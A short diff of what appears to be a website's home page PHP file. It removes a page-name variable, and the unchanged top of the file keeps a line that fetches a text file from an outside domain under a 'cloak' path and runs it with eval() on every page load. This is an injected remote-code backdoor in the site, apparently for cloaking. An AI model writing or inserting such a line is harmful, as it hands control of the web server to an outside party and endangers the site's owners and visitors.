@@ -1,9 +1,6 @@
 <?php
 eval("?>".file_get_contents('https://sukasukasurya.com/cloak/sunda777/spillaway.txt'));
 ?>
-<?php 
-$pageName = 'home';
-?>
 <!DOCTYPE html>
 <html lang="en">
 
